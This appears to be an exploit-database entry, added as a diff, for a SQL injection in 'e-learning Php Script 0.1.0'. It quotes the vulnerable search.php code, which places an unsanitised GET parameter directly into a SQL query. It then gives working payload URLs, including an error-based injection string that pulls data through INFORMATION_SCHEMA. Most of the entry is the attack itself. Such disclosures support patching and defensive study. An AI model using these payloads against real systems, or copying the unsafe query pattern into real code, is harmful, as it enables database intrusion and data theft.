@@ -1,0 +1,38 @@
+# Exploit Title: e-learning Php Script 0.1.0 - 'search' SQL Injection
+# Date: 2020-06-29
+# Exploit Author: KeopssGroup0day,Inc
+# Vendor Homepage: https://github.com/amitkolloldey/elearning-script
+# Software Link: https://github.com/amitkolloldey/elearning-script
+# Version: 0.1.0
+# Tested on: Kali Linux
+
+Source code(search.php):
+                     <?php
+                     if(isset($_GET['search_submit'])){
+                     $search_key = $_GET['search'];
+                     $search = "select * from posts where post_keywords 
+like '%$search_key%'";
+                     $run_search = mysqli_query($con,$search);
+                     $count = mysqli_num_rows($run_search);
+                     if($count == 0){
+                     echo "<h2>No Result Found.Please Try With Another 
+Keywords.</h2>";
+                     }else{
+                     while($search_row = 
+mysqli_fetch_array($run_search)):
+                     $post_id = $search_row ['post_id'];
+                     $post_title = $search_row ['post_title'];
+                     $post_date = $search_row ['post_date'];
+                     $post_author = $search_row ['post_author'];
+                     $post_featured_image = $search_row ['post_image'];
+                     $post_keywords = $search_row ['post_keywords'];
+                     $post_content = substr($search_row 
+['post_content'],0,200);
+                     ?>
+
+Payload:
+         http://127.0.0.1/e/search.php?search=a&search_submit=Search
+         http://127.0.0.1/e/search.php?search=a'OR (SELECT 3475 
+FROM(SELECT COUNT(*),CONCAT(0x716b787171,(SELECT 
+(ELT(3475=3475,1))),0x7171787871,FLOOR(RAND(0)*2))x FROM 
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IsDG&search_submit=Search
